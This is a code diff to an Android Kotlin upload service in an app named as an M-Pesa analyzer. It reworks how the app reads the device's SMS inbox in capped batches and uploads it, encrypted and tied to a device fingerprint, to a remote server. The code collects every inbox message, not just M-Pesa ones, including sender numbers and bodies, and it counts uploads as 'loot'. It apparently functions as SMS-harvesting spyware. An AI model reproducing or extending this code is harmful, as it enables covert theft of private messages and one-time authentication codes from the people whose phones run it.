@@ -23,6 +23,7 @@ import com.niccher.mpesa_analyzer_app.helpers.DeviceFingerprint
 import com.niccher.mpesa_analyzer_app.helpers.Encryptor
 import com.niccher.mpesa_analyzer_app.helpers.Prefs
 import com.niccher.mpesa_analyzer_app.helpers.ProgressRequestBody
+import com.niccher.mpesa_analyzer_app.helpers.SyncSession
 import com.niccher.mpesa_analyzer_app.interfaces.JsonUploadLoot
 import com.niccher.mpesa_analyzer_app.konstants.Konstants
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
@@ -30,9 +31,6 @@ import okhttp3.MultipartBody
 import okhttp3.RequestBody
 import okhttp3.RequestBody.Companion.toRequestBody
 import okhttp3.ResponseBody
-import retrofit2.Call
-import retrofit2.Callback
-import retrofit2.Response
 import java.io.BufferedInputStream
 import java.io.File
 import java.io.FileInputStream
@@ -56,7 +54,10 @@ class UploadService : Service() {
         const val EXTRA_SUCCESS = "success"
         const val EXTRA_MESSAGE = "message"
         const val EXTRA_COUNT = "sms_count"
+        const val MAX_SMS_PER_BATCH = 2000
     }
+
+    private class SmsBatch(val count: Int, val payload: StringBuffer, val maxId: Long)
 
     override fun onCreate() {
         super.onCreate()
@@ -167,78 +168,143 @@ class UploadService : Service() {
         }
         Log.d(kon.TAGGED, "Device ID OK")
 
-        // --- Query ALL SMS since last upload ---
-        val prefRead = context.getSharedPreferences(kon.SHARED_LAST_TIME, Context.MODE_PRIVATE)
-        val value = prefRead.getString(kon.SHARED_LAST_TIME, "0")
-        val lastUploadTime = value?.toLongOrNull() ?: 0L
-        Log.i(kon.TAGGED, "Last upload watermark (ms)=$lastUploadTime")
+        // --- Begin a sync session (shared UUID + attempt counter across all batches) ---
+        val sessionId = SyncSession.begin(context)
+        Log.i(kon.TAGGED, "Sync session=$sessionId attempt=${SyncSession.attemptNumber}")
 
-        val selection = "${Telephony.Sms.DATE} > ?"
-        val selectionArgs = arrayOf(lastUploadTime.toString())
+        // --- Read _id watermark (SMS rowid cursor, clock-independent) ---
+        val prefRead = context.getSharedPreferences(kon.SHARED_LAST_TIME, Context.MODE_PRIVATE)
+        var watermark = prefRead.getLong(kon.SHARED_LAST_SMS_ID, -1L)
+        if (watermark < 0L) {
+            // First run after upgrade: seed the cursor from the old time-based watermark
+            val lastUploadTime = prefRead.getString(kon.SHARED_LAST_TIME, "0")?.toLongOrNull() ?: 0L
+            watermark = seedWatermarkFromTime(context, lastUploadTime)
+            prefRead.edit().putLong(kon.SHARED_LAST_SMS_ID, watermark).commit()
+            Log.i(kon.TAGGED, "Migrated watermark: time=$lastUploadTime -> sms_id=$watermark")
+        }
+        Log.i(kon.TAGGED, "Last upload _id watermark=$watermark")
+
+        // --- Loop: fetch capped batches and upload until the inbox is drained ---
+        var totalUploaded = 0
+        var batchNo = 0
+        while (true) {
+            batchNo++
+            val batch = queryInboxBatch(context, watermark)
+            if (batch == null) {
+                finishWithResult(false, "SMS permission blocked by system.")
+                return
+            }
+
+            if (batch.count == 0) {
+                val msg = if (totalUploaded == 0) {
+                    "No new messages to upload."
+                } else {
+                    "All messages uploaded ($totalUploaded total)."
+                }
+                prefRead.edit()
+                    .putString(kon.SHARED_LAST_TIME, System.currentTimeMillis().toString())
+                    .putLong(kon.SHARED_LAST_SMS_ID, watermark)
+                    .commit()
+                finishWithResult(true, msg, totalUploaded)
+                return
+            }
+
+            val fileName = "sms_All_${System.currentTimeMillis()}_$batchNo"
+            val (ok, message) = prepareAndUpload(
+                context, fileName, batch.payload, partToken, partDevId, batch.count, batchNo > 1
+            )
+            if (!ok) {
+                finishWithResult(false, message)
+                return
+            }
+
+            watermark = batch.maxId
+            prefRead.edit().putLong(kon.SHARED_LAST_SMS_ID, watermark).commit()
+            prefs.getFileType(fileName, System.currentTimeMillis().toString(), context)
+            incrementLootCount(context)
+            totalUploaded += batch.count
+            Log.i(kon.TAGGED, "Batch $batchNo uploaded (${batch.count} msgs), watermark -> $watermark (total $totalUploaded)")
+        }
+    }
+
+    private fun queryInboxBatch(context: Context, watermark: Long): SmsBatch? {
+        val selection = "${Telephony.Sms._ID} > ? AND ${Telephony.Sms.TYPE} = ?"
+        val selectionArgs = arrayOf(watermark.toString(), Telephony.Sms.MESSAGE_TYPE_INBOX.toString())
+        val sortOrder = "${Telephony.Sms._ID} ASC LIMIT $MAX_SMS_PER_BATCH"
 
         val cr: ContentResolver = context.contentResolver
         val cursor = try {
-            Log.d(kon.TAGGED, "Querying SMS ContentResolver...")
-            cr.query(Telephony.Sms.CONTENT_URI, null, selection, selectionArgs, null)
+            Log.d(kon.TAGGED, "Querying SMS ContentResolver (batch)...")
+            cr.query(Telephony.Sms.CONTENT_URI, null, selection, selectionArgs, sortOrder)
         } catch (se: SecurityException) {
             Log.e(kon.TAGGED, "SMS query SecurityException: ${se.message}", se)
-            finishWithResult(false, "SMS permission blocked by system.")
-            return
+            return null
         }
 
         if (cursor == null) {
             Log.e(kon.TAGGED, "FAIL: SMS cursor null")
-            finishWithResult(false, "Could not read SMS inbox.")
-            return
+            return null
         }
 
+        val payload = StringBuffer()
+        var count = 0
+        var maxId = watermark
         cursor.use { c ->
-            val totalSMS = c.count
-            Log.i(kon.TAGGED, "SMS found since watermark: $totalSMS")
-
-            if (!c.moveToFirst() || totalSMS == 0) {
-                Log.i(kon.TAGGED, "No new SMS to upload")
-                finishWithResult(true, "No new messages to upload.", 0)
-                return
+            if (c.moveToFirst()) {
+                do {
+                    val smsId = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID))
+                    val smsIdLong = smsId.toLongOrNull() ?: 0L
+                    if (smsIdLong > maxId) maxId = smsIdLong
+                    val smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE))
+                    val smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
+                    // NO_WRAP: DEFAULT inserts newlines that break the embedded JSON on the server
+                    val smsBody = Base64.encodeToString(
+                        c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).toByteArray(),
+                        Base64.NO_WRAP
+                    )
+                    val smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))
+                    val smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
+                    payload.append(
+                        "{\"Type\": \"inbox\",\"Number\": \"$smsNumber\"," +
+                            "\"Thread Id\": $smsThreadid,\"Date\": $smsDate," +
+                            "\"Body\": \"$smsBody\",\"Seen\": $smsSeen,\"ID\": $smsId },-------(//)--------"
+                    )
+                    count++
+                } while (c.moveToNext())
             }
-
-            val sbsent = StringBuffer()
-            for (j in 0 until totalSMS) {
-                val smsDate = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.DATE))
-                val smsNumber = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
-                // NO_WRAP: DEFAULT inserts newlines that break the embedded JSON on the server
-                val smsBody = Base64.encodeToString(
-                    c.getString(c.getColumnIndexOrThrow(Telephony.Sms.BODY)).toByteArray(),
-                    Base64.NO_WRAP
-                )
-                val smsSeen = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.SEEN))
-                val smsThreadid = c.getString(c.getColumnIndexOrThrow(Telephony.Sms.THREAD_ID))
-                val smsId = c.getString(c.getColumnIndexOrThrow(Telephony.Sms._ID))
-
-                val smsType = when (
-                    c.getString(c.getColumnIndexOrThrow(Telephony.Sms.TYPE)).toInt()
-                ) {
-                    Telephony.Sms.MESSAGE_TYPE_INBOX -> "inbox"
-                    Telephony.Sms.MESSAGE_TYPE_SENT -> "sent"
-                    Telephony.Sms.MESSAGE_TYPE_OUTBOX -> "outbox"
-                    Telephony.Sms.MESSAGE_TYPE_QUEUED -> "queued"
-                    Telephony.Sms.MESSAGE_TYPE_DRAFT -> "draft"
-                    else -> ""
-                }
-                sbsent.append(
-                    "{\"Type\": \"$smsType\",\"Number\": \"$smsNumber\"," +
-                        "\"Thread Id\": $smsThreadid,\"Date\": $smsDate," +
-                        "\"Body\": \"$smsBody\",\"Seen\": $smsSeen,\"ID\": $smsId },-------(//)--------"
-                )
-                c.moveToNext()
-            }
-
-            val fileName = "sms_All_${System.currentTimeMillis()}"
-            Log.i(kon.TAGGED, "Prepared $totalSMS messages, creating encrypted file: $fileName")
-            makeEncryptedFile(context, fileName, sbsent, partToken, partDevId, totalSMS)
         }
+        Log.i(kon.TAGGED, "Batch query: $count SMS since watermark=$watermark (maxId=$maxId)")
+        return SmsBatch(count, payload, maxId)
+    }
 
-        Log.i(kon.TAGGED, "=== UPLOAD PIPELINE FINISHED ===")
+    private fun seedWatermarkFromTime(context: Context, lastUploadTime: Long): Long {
+        if (lastUploadTime <= 0L) return 0L
+        val cr: ContentResolver = context.contentResolver
+        val projection = arrayOf("MAX(${Telephony.Sms._ID}) AS max_id")
+        val selection = "${Telephony.Sms.TYPE} = ? AND ${Telephony.Sms.DATE} <= ?"
+        val selectionArgs = arrayOf(Telephony.Sms.MESSAGE_TYPE_INBOX.toString(), lastUploadTime.toString())
+        return try {
+            cr.query(Telephony.Sms.CONTENT_URI, projection, selection, selectionArgs, null)?.use { c ->
+                if (c.moveToFirst()) {
+                    val idx = c.getColumnIndexOrThrow("max_id")
+                    if (c.isNull(idx)) 0L else c.getLong(idx)
+                } else {
+                    0L
+                }
+            } ?: 0L
+        } catch (e: Exception) {
+            Log.e(kon.TAGGED, "Watermark migration query failed: ${e.message}", e)
+            0L
+        }
+    }
+
+    private fun incrementLootCount(context: Context) {
+        val prefLootCount = context.getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)
+        val currentCount = prefLootCount.getInt("loot_count", 0)
+        val newCount = currentCount + 1
+        // Use commit() to ensure write completes before broadcast
+        prefLootCount.edit().putInt("loot_count", newCount).commit()
+        Log.i(kon.TAGGED, "Incremented loot_count to $newCount")
     }
 
     private fun cryptor(inputFile: File, inputStream: InputStream) {
@@ -251,14 +317,15 @@ class UploadService : Service() {
         Log.e(kon.TAGGED, "Cryptor: Encryption Completed")
     }
 
-    private fun makeEncryptedFile(
+    private fun prepareAndUpload(
         context: Context,
         fileName: String,
         dataSource: StringBuffer,
         partToken: String,
         partDevId: String,
-        smsCount: Int
-    ) {
+        smsCount: Int,
+        isContinuation: Boolean
+    ): Pair<Boolean, String> {
         var fos: FileOutputStream? = null
         try {
             fos = context.openFileOutput("${kon.STRING_PLAIN_FILE}$fileName", Context.MODE_PRIVATE)
@@ -270,16 +337,22 @@ class UploadService : Service() {
             val fileInputStream = BufferedInputStream(FileInputStream(fileEncPlain))
             cryptor(fileEncAes, fileInputStream)
 
-            parserUpload(context, fileEncAes, fileName, partToken, partDevId, smsCount)
+            val result = parserUpload(
+                context, fileEncAes, fileName, partToken, partDevId, smsCount, isContinuation
+            )
+
+            fileEncPlain.delete()
+            fileEncAes.delete()
+            return result
         } catch (e: FileNotFoundException) {
             Log.e(kon.TAGGED, "Error 1  ${e.message}")
-            finishWithResult(false, "Could not create upload file: ${e.message}")
+            return false to "Could not create upload file: ${e.message}"
         } catch (e: IOException) {
             Log.e(kon.TAGGED, "Error 2  ${e.message}")
-            finishWithResult(false, "IO error preparing upload: ${e.message}")
+            return false to "IO error preparing upload: ${e.message}"
         } catch (e: Exception) {
             Log.e(kon.TAGGED, "Encrypt/prepare error: ${e.message}", e)
-            finishWithResult(false, "Encrypt failed: ${e.message}")
+            return false to "Encrypt failed: ${e.message}"
         } finally {
             try {
                 fos?.close()
@@ -294,8 +367,9 @@ class UploadService : Service() {
         filename: String,
         partToken: String,
         partDevId: String,
-        smsCount: Int
-    ) {
+        smsCount: Int,
+        isContinuation: Boolean
+    ): Pair<Boolean, String> {
         Log.i(kon.TAGGED, "Starting parserUpload: file=${files.name} size=${files.length()} bytes")
 
         val builder = NotificationCompat.Builder(context, CHANNEL_PROGRESS)
@@ -319,85 +393,60 @@ class UploadService : Service() {
         val textType = "text/plain".toMediaTypeOrNull()
         val requestBody0 = partToken.toRequestBody(textType)
         val requestBody1 = partDevId.toRequestBody(textType)
+        val varBatch = (if (isContinuation) "1" else "0").toRequestBody(textType)
 
-        Log.i(kon.TAGGED, "Enqueueing upload request to server")
-        val call = service.upload(requestBody0, requestBody1, body)
-        call.enqueue(object : Callback<ResponseBody> {
-            override fun onResponse(call: Call<ResponseBody>, response: Response<ResponseBody>) {
-                val raw = try {
-                    if (response.isSuccessful) {
-                        response.body()?.string().orEmpty()
-                    } else {
-                        response.errorBody()?.string().orEmpty()
-                    }
-                } catch (e: Exception) {
-                    Log.e(kon.TAGGED, "Read response body failed: ${e.message}")
-                    ""
+        Log.i(kon.TAGGED, "Enqueueing upload request to server (continuation=$isContinuation)")
+        val call = service.upload(requestBody0, requestBody1, varBatch, body)
+
+        return try {
+            val response = call.execute()
+            val raw = try {
+                if (response.isSuccessful) {
+                    response.body()?.string().orEmpty()
+                } else {
+                    response.errorBody()?.string().orEmpty()
                 }
-
-                Log.i(kon.TAGGED, "Upload HTTP ${response.code()} body=$raw")
-
-                try {
-                    if (raw.isBlank()) {
-                        finishWithResult(
-                            false,
-                            "Empty server response (HTTP ${response.code()})"
-                        )
-                        return
-                    }
-
-                    val jsonObject = org.json.JSONObject(raw)
-                    val status = jsonObject.optInt("status", -1)
-                    val message = jsonObject.optString(
-                        "message",
-                        jsonObject.optString("error", "Unknown error")
-                    )
-
-                    if (status == 1) {
-                        Log.i(kon.TAGGED, "Upload SUCCESS: $message")
-                        val encPlain = File(context.filesDir, "/${kon.STRING_PLAIN_FILE}$filename")
-                        val encAes = File(context.filesDir, "/${kon.STRING_ENC_AES_FILES}$filename")
-                        encPlain.delete()
-                        encAes.delete()
-
-                        prefs.getFileType(filename, System.currentTimeMillis().toString(), context)
-
-                        val prefLootCount =
-                            context.getSharedPreferences(kon.SHARED_LOOT_COUNT, Context.MODE_PRIVATE)
-                        val currentCount = prefLootCount.getInt("loot_count", 0)
-                        val newCount = currentCount + 1
-                        // Use commit() to ensure write completes before broadcast
-                        prefLootCount.edit().putInt("loot_count", newCount).commit()
-                        Log.i(kon.TAGGED, "Incremented loot_count to $newCount")
-
-                        finishWithResult(
-                            true,
-                            message.ifBlank { "Upload complete ($smsCount messages)" },
-                            smsCount
-                        )
-                    } else {
-                        Log.e(kon.TAGGED, "Upload FAILED by server: status=$status msg=$message")
-                        finishWithResult(false, message.ifBlank { "Upload failed (status=$status)" })
-                    }
-                } catch (e: Exception) {
-                    Log.e(kon.TAGGED, "Parse upload response error: ${e.message}", e)
-                    finishWithResult(
-                        false,
-                        "Bad server response (HTTP ${response.code()}): ${raw.take(200)}"
-                    )
-                }
+            } catch (e: Exception) {
+                Log.e(kon.TAGGED, "Read response body failed: ${e.message}")
+                ""
             }
 
-            override fun onFailure(call: Call<ResponseBody>, t: Throwable) {
-                Log.e(kon.TAGGED, "Upload network error: ${t.message}", t)
-                finishWithResult(false, "Network error: ${t.message}")
+            Log.i(kon.TAGGED, "Upload HTTP ${response.code()} body=$raw")
+
+            if (raw.isBlank()) {
+                return false to "Empty server response (HTTP ${response.code()})"
             }
-        })
-        Log.i(kon.TAGGED, "Upload request enqueued, waiting for response...")
+
+            val status: Int
+            val message: String
+            try {
+                val jsonObject = org.json.JSONObject(raw)
+                status = jsonObject.optInt("status", -1)
+                message = jsonObject.optString(
+                    "message",
+                    jsonObject.optString("error", "Unknown error")
+                )
+            } catch (e: Exception) {
+                Log.e(kon.TAGGED, "Parse upload response error: ${e.message}", e)
+                return false to "Bad server response (HTTP ${response.code()}): ${raw.take(200)}"
+            }
+
+            if (status == 1) {
+                Log.i(kon.TAGGED, "Upload SUCCESS: $message")
+                true to message.ifBlank { "Upload complete ($smsCount messages)" }
+            } else {
+                Log.e(kon.TAGGED, "Upload FAILED by server: status=$status msg=$message")
+                false to message.ifBlank { "Upload failed (status=$status)" }
+            }
+        } catch (e: Exception) {
+            Log.e(kon.TAGGED, "Upload network error: ${e.message}", e)
+            false to "Network error: ${e.message}"
+        }
     }
 
     private fun finishWithResult(success: Boolean, message: String, smsCount: Int = 0) {
         Log.i(kon.TAGGED, "Upload finish success=$success msg=$message count=$smsCount")
+        SyncSession.end()
 
         val channel = CHANNEL_RESULT
         val title = if (success) "Upload Complete" else "Upload Failed"
